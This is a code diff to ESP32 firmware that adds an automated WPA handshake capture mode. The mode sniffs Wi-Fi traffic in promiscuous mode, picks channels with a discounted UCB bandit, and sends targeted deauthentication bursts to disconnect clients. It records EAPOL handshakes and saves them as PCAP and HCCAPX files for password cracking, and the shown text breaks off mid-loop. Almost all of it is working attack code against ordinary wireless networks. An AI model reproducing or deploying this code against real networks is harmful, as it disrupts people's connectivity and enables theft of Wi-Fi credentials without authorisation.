@@ -75,6 +75,11 @@
 
 #include "attack_handshake.h"
 #include "hccapx_serializer.h"
+#include "pcap_serializer.h"
+#include "frame_analyzer_parser.h"
+#include "frame_analyzer_types.h"
+#include "sniffer.h"
+#include <math.h>
 
 // NimBLE includes for BLE scanning
 #include "nimble/nimble_port.h"
@@ -348,6 +353,63 @@ static wifi_ap_record_t *handshake_targets = NULL;          // ~6.4 KB in PSRAM
 static int handshake_target_count = 0;
 static bool handshake_captured[MAX_AP_CNT]; // Track which networks have captured handshakes
 static int handshake_current_index = 0;
+
+// ============================================================================
+// Sniffer-based Handshake Attack with D-UCB Channel Selection (scan-all mode)
+// ============================================================================
+
+#define HS_MAX_APS      64
+#define HS_MAX_CLIENTS  128
+#define DUCB_GAMMA      0.99    // Discount factor (recent observations matter more)
+#define DUCB_C          1.0     // Exploration constant
+#define HS_DEAUTH_COOLDOWN_US  (10 * 1000000LL)  // 10s cooldown between deauths per client
+#define HS_DWELL_TIME_MS       400                // Time spent on each channel
+#define HS_STATS_INTERVAL_US   (30 * 1000000LL)   // Log stats every 30s
+
+// D-UCB state per channel
+typedef struct {
+    int channel;
+    double discounted_reward;   // Σ γ^(t-s) * reward_s
+    double discounted_pulls;    // Σ γ^(t-s) * 1 (for this arm)
+    int total_pulls;            // total times this channel was selected
+} ducb_channel_t;
+
+// Multi-AP handshake target (discovered from sniffing)
+typedef struct {
+    uint8_t bssid[6];
+    char ssid[33];
+    uint8_t channel;
+    wifi_auth_mode_t authmode;
+    int rssi;
+    bool captured_m1, captured_m2, captured_m3, captured_m4;
+    bool complete;
+    bool beacon_captured;
+    bool has_existing_file;     // Already captured on SD
+    int64_t last_deauth_us;
+} hs_ap_target_t;
+
+// Client discovered by sniffing
+typedef struct {
+    uint8_t mac[6];
+    int hs_ap_index;            // index into hs_ap_targets[]
+    int rssi;
+    int64_t last_seen_us;
+    int64_t last_deauth_us;
+    bool deauthed;
+} hs_client_entry_t;
+
+// Sniffer handshake state
+static hs_ap_target_t *hs_ap_targets = NULL;     // PSRAM
+static int hs_ap_count = 0;
+static hs_client_entry_t *hs_clients = NULL;      // PSRAM
+static int hs_client_count = 0;
+static ducb_channel_t *ducb_channels = NULL;       // PSRAM
+static int ducb_channel_count = 0;
+static double ducb_discounted_total = 0.0;         // Σ γ^(t-s) across all arms
+
+// Per-dwell reward counters (reset each dwell)
+static volatile int hs_dwell_new_clients = 0;
+static volatile int hs_dwell_eapol_frames = 0;
 
 // Beacon spam task
 static TaskHandle_t beacon_spam_task_handle = NULL;
@@ -979,9 +1041,13 @@ static bool init_psram_buffers(void)
     target_bssids = heap_caps_calloc(MAX_TARGET_BSSIDS, sizeof(target_bssid_t), MALLOC_CAP_SPIRAM);
     whiteListedBssids = heap_caps_calloc(MAX_WHITELISTED_BSSIDS, sizeof(whitelisted_bssid_t), MALLOC_CAP_SPIRAM);
     selected_stations = heap_caps_calloc(MAX_SELECTED_STATIONS, sizeof(selected_station_t), MALLOC_CAP_SPIRAM);
+    hs_ap_targets = heap_caps_calloc(HS_MAX_APS, sizeof(hs_ap_target_t), MALLOC_CAP_SPIRAM);
+    hs_clients = heap_caps_calloc(HS_MAX_CLIENTS, sizeof(hs_client_entry_t), MALLOC_CAP_SPIRAM);
+    ducb_channels = heap_caps_calloc(dual_band_channels_count, sizeof(ducb_channel_t), MALLOC_CAP_SPIRAM);
     
     if (!sniffer_aps || !probe_requests || !bt_devices || !wardrive_scan_results ||
-        !handshake_targets || !sd_html_files || !target_bssids || !whiteListedBssids || !selected_stations) {
+        !handshake_targets || !sd_html_files || !target_bssids || !whiteListedBssids || !selected_stations ||
+        !hs_ap_targets || !hs_clients || !ducb_channels) {
         MY_LOG_INFO(TAG, "PSRAM allocation failed!");
         return false;
     }
@@ -1113,11 +1179,20 @@ static void deauth_attack_task(void *pvParameters);
 static void blackout_attack_task(void *pvParameters);
 static void sae_attack_task(void *pvParameters);
 static void handshake_attack_task(void *pvParameters);
+static void handshake_attack_task_selected(void);
+static void handshake_attack_task_sniffer(void);
 static void beacon_spam_task(void *pvParameters);
 static bool check_handshake_file_exists(const char *ssid);
+static bool check_handshake_file_exists_by_bssid(const uint8_t *bssid);
 static void handshake_cleanup(void);
-static void quick_scan_all_channels(void);
 static void attack_network_with_burst(const wifi_ap_record_t *ap);
+// D-UCB and sniffer handshake helpers
+static void ducb_init(void);
+static int ducb_select_channel(void);
+static void ducb_update(int channel_idx, double reward);
+static void hs_sniffer_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type);
+static void hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *ap_bssid, uint8_t channel);
+static bool hs_save_handshake_to_sd(int ap_idx);
 static void gps_raw_task(void *pvParameters);
 // DNS server task
 static void dns_server_task(void *pvParameters);
@@ -3658,12 +3733,532 @@ static bool check_handshake_file_exists(const char *ssid) {
     return found;
 }
 
+// Also check by BSSID (more reliable than SSID for hidden/duplicate networks)
+static bool check_handshake_file_exists_by_bssid(const uint8_t *bssid) {
+    char mac_suffix[7];
+    snprintf(mac_suffix, sizeof(mac_suffix), "%02X%02X%02X", bssid[3], bssid[4], bssid[5]);
+    
+    DIR *dir = opendir("/sdcard/lab/handshakes");
+    if (dir == NULL) return false;
+    
+    struct dirent *entry;
+    bool found = false;
+    while ((entry = readdir(dir)) != NULL) {
+        if (strstr(entry->d_name, mac_suffix) != NULL &&
+            strstr(entry->d_name, ".pcap") != NULL) {
+            found = true;
+            break;
+        }
+    }
+    closedir(dir);
+    return found;
+}
+
+// ============================================================================
+// D-UCB (Discounted Upper Confidence Bound) Algorithm for Channel Selection
+// ============================================================================
+
+static void ducb_init(void) {
+    ducb_channel_count = dual_band_channels_count;
+    ducb_discounted_total = 0.0;
+    for (int i = 0; i < ducb_channel_count; i++) {
+        ducb_channels[i].channel = dual_band_channels[i];
+        ducb_channels[i].discounted_reward = 0.0;
+        ducb_channels[i].discounted_pulls = 0.0;
+        ducb_channels[i].total_pulls = 0;
+    }
+}
+
+// Apply discount to all channels (called before each selection)
+static void ducb_apply_discount(void) {
+    ducb_discounted_total *= DUCB_GAMMA;
+    for (int i = 0; i < ducb_channel_count; i++) {
+        ducb_channels[i].discounted_reward *= DUCB_GAMMA;
+        ducb_channels[i].discounted_pulls *= DUCB_GAMMA;
+    }
+}
+
+// Select best channel using D-UCB formula
+static int ducb_select_channel(void) {
+    ducb_apply_discount();
+    
+    int best_idx = 0;
+    double best_ucb = -1.0;
+    
+    for (int i = 0; i < ducb_channel_count; i++) {
+        // Forced exploration: unpulled channels have infinite UCB
+        if (ducb_channels[i].discounted_pulls < 0.001) {
+            // Find first unpulled channel
+            best_idx = i;
+            best_ucb = 1e18;
+            break;
+        }
+        
+        double avg_reward = ducb_channels[i].discounted_reward / ducb_channels[i].discounted_pulls;
+        double exploration = DUCB_C * sqrt(log(ducb_discounted_total + 1.0) / ducb_channels[i].discounted_pulls);
+        double ucb = avg_reward + exploration;
+        
+        if (ucb > best_ucb) {
+            best_ucb = ucb;
+            best_idx = i;
+        }
+    }
+    
+    return best_idx;
+}
+
+// Update D-UCB after observing reward on a channel
+static void ducb_update(int channel_idx, double reward) {
+    ducb_channels[channel_idx].discounted_pulls += 1.0;
+    ducb_channels[channel_idx].discounted_reward += reward;
+    ducb_channels[channel_idx].total_pulls++;
+    ducb_discounted_total += 1.0;
+}
+
+// ============================================================================
+// Sniffer Handshake: AP and Client Management
+// ============================================================================
+
+// Find AP by BSSID in hs_ap_targets, return index or -1
+static int hs_find_ap(const uint8_t *bssid) {
+    for (int i = 0; i < hs_ap_count; i++) {
+        if (memcmp(hs_ap_targets[i].bssid, bssid, 6) == 0) {
+            return i;
+        }
+    }
+    return -1;
+}
+
+// Add or update AP from beacon. Returns index.
+static int hs_add_or_update_ap(const uint8_t *bssid, const char *ssid, uint8_t channel,
+                                wifi_auth_mode_t authmode, int rssi) {
+    int idx = hs_find_ap(bssid);
+    if (idx >= 0) {
+        // Update existing
+        if (ssid && ssid[0]) strncpy(hs_ap_targets[idx].ssid, ssid, 32);
+        hs_ap_targets[idx].channel = channel;
+        hs_ap_targets[idx].rssi = rssi;
+        if (authmode != WIFI_AUTH_OPEN) hs_ap_targets[idx].authmode = authmode;
+        return idx;
+    }
+    if (hs_ap_count >= HS_MAX_APS) return -1;
+    
+    idx = hs_ap_count++;
+    memcpy(hs_ap_targets[idx].bssid, bssid, 6);
+    if (ssid) strncpy(hs_ap_targets[idx].ssid, ssid, 32);
+    hs_ap_targets[idx].ssid[32] = '\0';
+    hs_ap_targets[idx].channel = channel;
+    hs_ap_targets[idx].authmode = authmode;
+    hs_ap_targets[idx].rssi = rssi;
+    hs_ap_targets[idx].captured_m1 = false;
+    hs_ap_targets[idx].captured_m2 = false;
+    hs_ap_targets[idx].captured_m3 = false;
+    hs_ap_targets[idx].captured_m4 = false;
+    hs_ap_targets[idx].complete = false;
+    hs_ap_targets[idx].beacon_captured = false;
+    hs_ap_targets[idx].last_deauth_us = 0;
+    
+    // Check if we already have a handshake file for this network
+    hs_ap_targets[idx].has_existing_file = 
+        check_handshake_file_exists(ssid ? ssid : "") ||
+        check_handshake_file_exists_by_bssid(bssid);
+    
+    if (hs_ap_targets[idx].has_existing_file) {
+        MY_LOG_INFO(TAG, "[HS-SNIFF] Skipping '%s' - handshake already on SD", 
+                   hs_ap_targets[idx].ssid);
+    }
+    
+    return idx;
+}
+
+// Find client by MAC, return index or -1
+static int hs_find_client(const uint8_t *mac) {
+    for (int i = 0; i < hs_client_count; i++) {
+        if (memcmp(hs_clients[i].mac, mac, 6) == 0) {
+            return i;
+        }
+    }
+    return -1;
+}
+
+// Add or update client. Returns index.
+static int hs_add_or_update_client(const uint8_t *client_mac, int ap_index, int rssi) {
+    int64_t now = esp_timer_get_time();
+    int idx = hs_find_client(client_mac);
+    if (idx >= 0) {
+        // Update existing - keep AP association if already set, or update
+        if (ap_index >= 0) hs_clients[idx].hs_ap_index = ap_index;
+        hs_clients[idx].rssi = rssi;
+        hs_clients[idx].last_seen_us = now;
+        return idx;
+    }
+    if (hs_client_count >= HS_MAX_CLIENTS) return -1;
+    
+    idx = hs_client_count++;
+    memcpy(hs_clients[idx].mac, client_mac, 6);
+    hs_clients[idx].hs_ap_index = ap_index;
+    hs_clients[idx].rssi = rssi;
+    hs_clients[idx].last_seen_us = now;
+    hs_clients[idx].last_deauth_us = 0;
+    hs_clients[idx].deauthed = false;
+    
+    // This is a new client - bump the dwell reward counter
+    hs_dwell_new_clients++;
+    
+    return idx;
+}
+
+// ============================================================================
+// Sniffer Handshake: EAPOL Message Detection (inline, multi-AP)
+// ============================================================================
+
+// Determine EAPOL message number from parsed key packet. Returns 1-4 or 0.
+static uint8_t hs_get_eapol_msg_num(eapol_key_packet_t *eapol_key) {
+    if (!eapol_key) return 0;
+    
+    // Read Key Information (handle endianness like attack_handshake.c)
+    uint16_t key_info_raw = *((uint16_t*)&eapol_key->key_information);
+    uint8_t byte0 = (key_info_raw >> 8) & 0xFF;
+    uint8_t byte1 = key_info_raw & 0xFF;
+    
+    bool key_ack = (byte0 & 0x80) != 0;
+    bool install = (byte0 & 0x40) != 0;
+    bool key_mic = (byte1 & 0x01) != 0;
+    
+    // M1: ACK=1, Install=0, MIC=0
+    if (key_ack && !install && !key_mic) return 1;
+    // M3: ACK=1, Install=1, MIC=1
+    if (key_ack && install && key_mic) return 3;
+    // M2 or M4: ACK=0, MIC=1
+    if (!key_ack && key_mic && !install) {
+        // M2 has SNonce (non-zero), M4 does not
+        bool has_nonce = false;
+        for (int i = 0; i < 16; i++) {
+            if (eapol_key->key_nonce[i] != 0) { has_nonce = true; break; }
+        }
+        return has_nonce ? 2 : 4;
+    }
+    return 0;
+}
+
+// ============================================================================
+// Sniffer Handshake: Targeted Deauth
+// ============================================================================
+
+static void hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *ap_bssid, uint8_t channel) {
+    // Ensure we're on the correct channel
+    uint8_t current_channel;
+    wifi_second_chan_t second_chan;
+    esp_wifi_get_channel(&current_channel, &second_chan);
+    if (current_channel != channel) {
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        vTaskDelay(pdMS_TO_TICKS(5));
+    }
+    
+    // Build targeted deauth frame (destination = station, not broadcast)
+    uint8_t deauth_frame[] = {
+        0xC0, 0x00,                                     // Type/Subtype: Deauthentication
+        0x00, 0x00,                                     // Duration
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Destination: station MAC (filled below)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Source: AP BSSID (filled below)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // BSSID (filled below)
+        0x00, 0x00,                                     // Sequence
+        0x01, 0x00                                      // Reason: Unspecified
+    };
+    
+    // Set destination to specific station MAC
+    memcpy(&deauth_frame[4], station_mac, 6);
+    // Set source and BSSID to AP
+    memcpy(&deauth_frame[10], ap_bssid, 6);
+    memcpy(&deauth_frame[16], ap_bssid, 6);
+    
+    // Send burst of 5 packets
+    for (int i = 0; i < 5; i++) {
+        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        if (ret != ESP_OK) {
+            ESP_LOGW(TAG, "[HS-DEAUTH] Failed to send deauth #%d: %s", i + 1, esp_err_to_name(ret));
+        }
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+    
+    // Also send deauth from client to AP (bidirectional, increases success)
+    memcpy(&deauth_frame[4], ap_bssid, 6);    // Destination: AP
+    memcpy(&deauth_frame[10], station_mac, 6); // Source: Station
+    memcpy(&deauth_frame[16], ap_bssid, 6);   // BSSID: AP
+    for (int i = 0; i < 3; i++) {
+        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+}
+
+// ============================================================================
+// Sniffer Handshake: Per-AP PCAP Save
+// ============================================================================
+
+// Sanitize SSID for filename (same logic as attack_handshake.c)
+static void hs_sanitize_ssid(char *out, const char *in, size_t out_size) {
+    size_t j = 0;
+    for (size_t i = 0; in[i] && j < out_size - 1; i++) {
+        char c = in[i];
+        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || 
+            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
+            out[j++] = c;
+        } else {
+            out[j++] = '_';
+        }
+    }
+    out[j] = '\0';
+    if (j == 0) {
+        strncpy(out, "hidden", out_size - 1);
+        out[out_size - 1] = '\0';
+    }
+}
+
+static bool hs_save_handshake_to_sd(int ap_idx) {
+    hs_ap_target_t *ap = &hs_ap_targets[ap_idx];
+    
+    // We need to have the PCAP buffer populated and HCCAPX ready
+    hccapx_t *hccapx = (hccapx_t *)hccapx_serializer_get();
+    unsigned pcap_size = pcap_serializer_get_size();
+    uint8_t *pcap_buf = pcap_serializer_get_buffer();
+    
+    if (!pcap_buf || pcap_size == 0) {
+        MY_LOG_INFO(TAG, "[HS-SAVE] No PCAP data for '%s'", ap->ssid);
+        return false;
+    }
+    
+    // Create directory if needed
+    struct stat st = {0};
+    if (stat("/sdcard/lab/handshakes", &st) == -1) {
+        mkdir("/sdcard/lab/handshakes", 0700);
+    }
+    
+    char ssid_safe[33];
+    char mac_suffix[7];
+    hs_sanitize_ssid(ssid_safe, ap->ssid, sizeof(ssid_safe));
+    snprintf(mac_suffix, sizeof(mac_suffix), "%02X%02X%02X", 
+             ap->bssid[3], ap->bssid[4], ap->bssid[5]);
+    
+    uint64_t timestamp = esp_timer_get_time() / 1000;
+    char filename[128];
+    
+    // Save PCAP
+    snprintf(filename, sizeof(filename), "/sdcard/lab/handshakes/%s_%s_%llu.pcap",
+             ssid_safe, mac_suffix, (unsigned long long)timestamp);
+    
+    FILE *f = fopen(filename, "wb");
+    if (!f) {
+        MY_LOG_INFO(TAG, "[HS-SAVE] Failed to open: %s", filename);
+        return false;
+    }
+    size_t written = fwrite(pcap_buf, 1, pcap_size, f);
+    fclose(f);
+    
+    if (written != pcap_size) {
+        MY_LOG_INFO(TAG, "[HS-SAVE] Incomplete write: %zu/%u", written, pcap_size);
+        return false;
+    }
+    MY_LOG_INFO(TAG, "[HS-SAVE] PCAP saved: %s (%u bytes)", filename, pcap_size);
+    
+    // Save HCCAPX if available
+    if (hccapx) {
+        snprintf(filename, sizeof(filename), "/sdcard/lab/handshakes/%s_%s_%llu.hccapx",
+                 ssid_safe, mac_suffix, (unsigned long long)timestamp);
+        f = fopen(filename, "wb");
+        if (f) {
+            fwrite(hccapx, 1, sizeof(hccapx_t), f);
+            fclose(f);
+            MY_LOG_INFO(TAG, "[HS-SAVE] HCCAPX saved: %s", filename);
+        }
+    }
+    
+    // Sync SD
+    int fd = open("/sdcard/.sync", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd >= 0) { fsync(fd); close(fd); unlink("/sdcard/.sync"); }
+    
+    return true;
+}
+
+// ============================================================================
+// Sniffer Handshake: Promiscuous Callback
+// ============================================================================
+
+static void hs_sniffer_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (!handshake_attack_active) return;
+    
+    // Only process MGMT and DATA
+    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
+    
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *frame = pkt->payload;
+    int len = pkt->rx_ctrl.sig_len;
+    
+    if (len < 24) return; // Minimum 802.11 header
+    
+    uint8_t frame_type = frame[0] & 0xFC;
+    uint8_t to_ds = (frame[1] & 0x01) != 0;
+    uint8_t from_ds = (frame[1] & 0x02) != 0;
+    
+    uint8_t *addr1 = (uint8_t *)&frame[4];
+    uint8_t *addr2 = (uint8_t *)&frame[10];
+    uint8_t *addr3 = (uint8_t *)&frame[16];
+    
+    // ---- MGMT frames: beacon, association, auth ----
+    if (type == WIFI_PKT_MGMT) {
+        if (frame_type == 0x80) {
+            // Beacon: extract SSID, channel, authmode
+            uint8_t *ap_bssid = addr2;
+            
+            // Parse tagged parameters for SSID, channel, RSN
+            const uint8_t *body = frame + 24 + 12; // Skip MAC header + fixed params (timestamp 8, interval 2, cap 2)
+            int body_len = len - 24 - 12;
+            
+            char ssid[33] = {0};
+            uint8_t beacon_channel = pkt->rx_ctrl.channel;
+            wifi_auth_mode_t authmode = WIFI_AUTH_OPEN;
+            
+            int offset = 0;
+            while (offset + 2 <= body_len) {
+                uint8_t tag = body[offset];
+                uint8_t tag_len = body[offset + 1];
+                if (offset + 2 + tag_len > body_len) break;
+                
+                if (tag == 0 && tag_len > 0 && tag_len <= 32) {
+                    // SSID
+                    memcpy(ssid, &body[offset + 2], tag_len);
+                    ssid[tag_len] = '\0';
+                } else if (tag == 3 && tag_len == 1) {
+                    // DS Parameter Set (channel)
+                    beacon_channel = body[offset + 2];
+                } else if (tag == 48) {
+                    // RSN (WPA2)
+                    authmode = WIFI_AUTH_WPA2_PSK;
+                } else if (tag == 221) {
+                    // Vendor specific - check for WPA OUI
+                    if (tag_len >= 4 && body[offset+2] == 0x00 && body[offset+3] == 0x50 && 
+                        body[offset+4] == 0xF2 && body[offset+5] == 0x01) {
+                        if (authmode == WIFI_AUTH_OPEN) authmode = WIFI_AUTH_WPA_PSK;
+                    }
+                }
+                offset += 2 + tag_len;
+            }
+            
+            // Only track WPA/WPA2 APs (we can't capture handshakes for open networks)
+            if (authmode != WIFI_AUTH_OPEN) {
+                int ap_idx = hs_add_or_update_ap(ap_bssid, ssid, beacon_channel, authmode, pkt->rx_ctrl.rssi);
+                
+                // Save beacon frame to PCAP if not yet captured for this AP
+                // (beacon is needed for PMK calculation in hashcat/wpa-sec)
+                if (ap_idx >= 0 && !hs_ap_targets[ap_idx].beacon_captured && 
+                    !hs_ap_targets[ap_idx].has_existing_file && !hs_ap_targets[ap_idx].complete) {
+                    pcap_serializer_append_frame(frame, len, pkt->rx_ctrl.timestamp);
+                    hs_ap_targets[ap_idx].beacon_captured = true;
+                }
+            }
+            return;
+        }
+        
+        // Association Request (0x00) or Authentication (0xB0): client -> AP
+        if (frame_type == 0x00 || frame_type == 0xB0) {
+            uint8_t *client_mac = addr2;
+            uint8_t *ap_mac = addr1;
+            
+            // Skip broadcast/multicast
+            if (client_mac[0] & 0x01) return;
+            
+            int ap_idx = hs_find_ap(ap_mac);
+            if (ap_idx >= 0 && !hs_ap_targets[ap_idx].has_existing_file && !hs_ap_targets[ap_idx].complete) {
+                hs_add_or_update_client(client_mac, ap_idx, pkt->rx_ctrl.rssi);
+            }
+        }
+        return;
+    }
+    
+    // ---- DATA frames: client detection + EAPOL capture ----
+    if (type == WIFI_PKT_DATA) {
+        uint8_t *client_mac = NULL;
+        uint8_t *ap_mac = NULL;
+        
+        if (to_ds && !from_ds) {
+            // STA -> AP
+            ap_mac = addr1;
+            client_mac = addr2;
+        } else if (!to_ds && from_ds) {
+            // AP -> STA
+            ap_mac = addr2;
+            client_mac = addr1;
+        } else if (!to_ds && !from_ds) {
+            // IBSS
+            ap_mac = addr3;
+            client_mac = addr2;
+        } else {
+            return; // WDS
+        }
+        
+        // Skip broadcast/multicast client
+        if (client_mac[0] & 0x01) return;
+        
+        int ap_idx = hs_find_ap(ap_mac);
+        if (ap_idx < 0) return; // Unknown AP, ignore
+        
+        hs_ap_target_t *ap = &hs_ap_targets[ap_idx];
+        if (ap->has_existing_file || ap->complete) return; // Already done
+        
+        // Register client
+        hs_add_or_update_client(client_mac, ap_idx, pkt->rx_ctrl.rssi);
+        
+        // Check for EAPOL: parse the data frame for EAPOL packet
+        // The frame payload is a data_frame_t (802.11 data header + LLC/SNAP + EAPOL)
+        data_frame_t *data_frame = (data_frame_t *)frame;
+        eapol_packet_t *eapol = parse_eapol_packet(data_frame);
+        if (!eapol) return; // Not an EAPOL frame
+        
+        eapol_key_packet_t *eapol_key = parse_eapol_key_packet(eapol);
+        if (!eapol_key) return; // Not EAPOL-Key
+        
+        uint8_t msg_num = hs_get_eapol_msg_num(eapol_key);
+        if (msg_num == 0) return;
+        
+        hs_dwell_eapol_frames++;
+        
+        bool is_new = false;
+        switch (msg_num) {
+            case 1: if (!ap->captured_m1) { ap->captured_m1 = true; is_new = true; } break;
+            case 2: if (!ap->captured_m2) { ap->captured_m2 = true; is_new = true; } break;
+            case 3: if (!ap->captured_m3) { ap->captured_m3 = true; is_new = true; } break;
+            case 4: if (!ap->captured_m4) { ap->captured_m4 = true; is_new = true; } break;
+        }
+        
+        if (is_new) {
+            MY_LOG_INFO(TAG, "[HS-SNIFF] EAPOL M%d captured for '%s' (%02X:%02X:%02X:%02X:%02X:%02X)",
+                       msg_num, ap->ssid,
+                       ap->bssid[0], ap->bssid[1], ap->bssid[2], 
+                       ap->bssid[3], ap->bssid[4], ap->bssid[5]);
+            
+            // Append to PCAP
+            pcap_serializer_append_frame(frame, len, pkt->rx_ctrl.timestamp);
+            
+            // Feed to HCCAPX serializer
+            hccapx_serializer_add_frame(data_frame);
+            
+            // Check if complete
+            if (ap->captured_m1 && ap->captured_m2 && ap->captured_m3 && ap->captured_m4) {
+                ap->complete = true;
+                MY_LOG_INFO(TAG, "[HS-SNIFF] COMPLETE handshake for '%s'!", ap->ssid);
+            }
+        }
+    }
+}
+
 // Cleanup function for handshake attack
 static void handshake_cleanup(void) {
     MY_LOG_INFO(TAG, "Handshake attack cleanup...");
     
-    // Stop any active handshake attack
+    // Stop any active handshake attack (selected mode uses this)
     attack_handshake_stop();
+    
+    // Disable promiscuous mode (sniffer mode uses this)
+    esp_wifi_set_promiscuous(false);
     
     // Reset state
     handshake_attack_active = false;
@@ -3672,6 +4267,14 @@ static void handshake_cleanup(void) {
     handshake_current_index = 0;
     memset(handshake_targets, 0, MAX_AP_CNT * sizeof(wifi_ap_record_t));
     memset(handshake_captured, 0, sizeof(handshake_captured));
+    
+    // Reset sniffer handshake state
+    hs_ap_count = 0;
+    hs_client_count = 0;
+    hs_dwell_new_clients = 0;
+    hs_dwell_eapol_frames = 0;
+    if (hs_ap_targets) memset(hs_ap_targets, 0, HS_MAX_APS * sizeof(hs_ap_target_t));
+    if (hs_clients) memset(hs_clients, 0, HS_MAX_CLIENTS * sizeof(hs_client_entry_t));
     
     // Restore idle LED
     esp_err_t led_err = led_set_idle();
@@ -3683,7 +4286,8 @@ static void handshake_cleanup(void) {
 }
 
 // Quick scan all channels (both 2.4GHz and 5GHz) - 500ms per channel
-static void quick_scan_all_channels(void) {
+// (kept for potential future use; currently unused since sniffer+D-UCB replaced scan-all mode)
+static void __attribute__((unused)) quick_scan_all_channels(void) {
     MY_LOG_INFO(TAG, "Quick scanning all channels (2.4GHz + 5GHz)...");
     
     // Scan 2.4GHz channels
@@ -3743,12 +4347,245 @@ static void attack_network_with_burst(const wifi_ap_record_t *ap) {
     attack_handshake_stop();
 }
 
-// Handshake attack task - Pwnagotchi-style hybrid approach
+// ============================================================================
+// Handshake Attack Task: Selected Networks Mode (unchanged logic)
+// ============================================================================
+static void handshake_attack_task_selected(void) {
+    MY_LOG_INFO(TAG, "===== Selected Networks Mode =====");
+    MY_LOG_INFO(TAG, "Attacking %d selected networks in loop until all captured", handshake_target_count);
+    
+    while (handshake_attack_active && !operation_stop_requested) {
+        // Check if we're done
+        bool all_captured = true;
+        for (int i = 0; i < handshake_target_count; i++) {
+            if (!handshake_captured[i]) { all_captured = false; break; }
+        }
+        if (all_captured) {
+            MY_LOG_INFO(TAG, "All selected networks captured! Attack complete.");
+            break;
+        }
+        
+        int attacked_count = 0;
+        int captured_count = 0;
+        
+        for (int i = 0; i < handshake_target_count && handshake_attack_active && !operation_stop_requested; i++) {
+            wifi_ap_record_t *ap = &handshake_targets[i];
+            if (handshake_captured[i]) continue;
+            
+            if (check_handshake_file_exists((const char*)ap->ssid)) {
+                handshake_captured[i] = true;
+                captured_count++;
+                continue;
+            }
+            
+            attacked_count++;
+            MY_LOG_INFO(TAG, ">>> [%d/%d] Attacking '%s' (Ch %d, RSSI: %d dBm) <<<",
+                       i + 1, handshake_target_count, (const char*)ap->ssid, ap->primary, ap->rssi);
+            
+            attack_network_with_burst(ap);
+            
+            if (attack_handshake_is_complete()) {
+                handshake_captured[i] = true;
+                captured_count++;
+                MY_LOG_INFO(TAG, "Handshake #%d captured!", captured_count);
+            }
+            
+            if (i < handshake_target_count - 1) {
+                vTaskDelay(pdMS_TO_TICKS(2000));
+            }
+        }
+        
+        MY_LOG_INFO(TAG, "Cycle: attacked=%d, captured=%d", attacked_count, captured_count);
+        
+        bool all_done = true;
+        int remaining = 0;
+        for (int i = 0; i < handshake_target_count; i++) {
+            if (!handshake_captured[i]) { all_done = false; remaining++; }
+        }
+        if (all_done) {
+            MY_LOG_INFO(TAG, "All selected networks captured!");
+            break;
+        }
+        MY_LOG_INFO(TAG, "%d networks remaining, repeating...", remaining);
+        vTaskDelay(pdMS_TO_TICKS(3000));
+    }
+}
+
+// ============================================================================
+// Handshake Attack Task: Sniffer + D-UCB Mode (new scan-all replacement)
+// ============================================================================
+static void handshake_attack_task_sniffer(void) {
+    MY_LOG_INFO(TAG, "===== Sniffer + D-UCB Mode =====");
+    MY_LOG_INFO(TAG, "Promiscuous sniffer with D-UCB channel selection");
+    MY_LOG_INFO(TAG, "Targeted deauth on discovered clients");
+    MY_LOG_INFO(TAG, "Channels: %d (2.4GHz + 5GHz)", dual_band_channels_count);
+    MY_LOG_INFO(TAG, "D-UCB gamma=%.3f, c=%.1f, dwell=%dms", DUCB_GAMMA, DUCB_C, HS_DWELL_TIME_MS);
+    
+    // 1. Initialize D-UCB
+    ducb_init();
+    
+    // 2. Reset sniffer state
+    hs_ap_count = 0;
+    hs_client_count = 0;
+    memset(hs_ap_targets, 0, HS_MAX_APS * sizeof(hs_ap_target_t));
+    memset(hs_clients, 0, HS_MAX_CLIENTS * sizeof(hs_client_entry_t));
+    
+    // 3. Initialize PCAP + HCCAPX serializers
+    pcap_serializer_init();
+    hccapx_serializer_init((const uint8_t *)"", 0); // Will be re-inited per-AP as needed
+    
+    // 4. Set up promiscuous mode with our callback
+    wifi_promiscuous_filter_t filter = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
+    };
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous_rx_cb(hs_sniffer_promiscuous_cb);
+    esp_wifi_set_promiscuous(true);
+    
+    MY_LOG_INFO(TAG, "Promiscuous mode enabled. Sniffing...");
+    
+    int64_t last_stats_time = esp_timer_get_time();
+    int total_handshakes_captured = 0;
+    
+    // 5. Main D-UCB loop
+    while (handshake_attack_active && !operation_stop_requested) {
+        // Select channel via D-UCB
+        int ch_idx = ducb_select_channel();
+        int channel = ducb_channels[ch_idx].channel;
+        
+        // Switch channel
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        
+        // Reset per-dwell counters
+        hs_dwell_new_clients = 0;
+        hs_dwell_eapol_frames = 0;
+        
+        // Dwell on this channel
+        vTaskDelay(pdMS_TO_TICKS(HS_DWELL_TIME_MS));
+        
+        if (!handshake_attack_active || operation_stop_requested) break;
+        
+        // After dwell: process discovered clients for targeted deauth
+        int64_t now = esp_timer_get_time();
+        int deauth_count_this_dwell = 0;
+        
+        for (int i = 0; i < hs_client_count && handshake_attack_active; i++) {
+            hs_client_entry_t *client = &hs_clients[i];
+            if (client->hs_ap_index < 0 || client->hs_ap_index >= hs_ap_count) continue;
+            
+            hs_ap_target_t *ap = &hs_ap_targets[client->hs_ap_index];
+            
+            // Skip if AP already captured or has existing file
+            if (ap->complete || ap->has_existing_file) continue;
+            
+            // Skip if AP is not on current channel
